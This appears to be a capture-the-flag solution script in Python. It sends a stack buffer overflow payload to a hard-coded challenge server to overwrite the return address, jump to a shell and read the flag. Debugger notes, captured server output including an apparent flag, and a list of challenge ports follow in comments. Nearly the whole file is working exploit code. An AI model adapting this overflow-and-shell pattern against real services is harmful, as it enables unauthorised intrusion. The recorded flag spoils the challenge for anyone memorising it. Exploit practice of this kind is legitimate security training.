import socket
import struct

HOST = "104.131.90.29"
PORT = 8001

def pack(p):
    return struct.pack('<I', p)

#overflow 32-byte name buffer into eip -> write eip to 0x000000000040076E
payload = b'A'*32 + b'B'*40
payload += pack(0x000000000040076E)

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print(sock.recv(1024))
    print(sock.recv(1024))
    sock.sendall(payload + b'\n')

    print(sock.recv(1024))
    print(sock.recv(1024))
    sock.sendall('cat flag\n'.encode())
    print(sock.recv(1024))
    sock.close()

main()

'''
break *0x000000000040073D
x/64xw $sp

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL

b"Are you cool? We'll use your name to find out."
b'\nEnter your name: '
b'Cool people get a shell!'
b'\n'
b'one_of_these_pops_up_everytiem\n'
'''

'''
8000 sanity check
8001 el clasico
8002 overflow
8003 shell
8004 never say goodbye
8005 python exploit 1
8006 python exploit 2

'''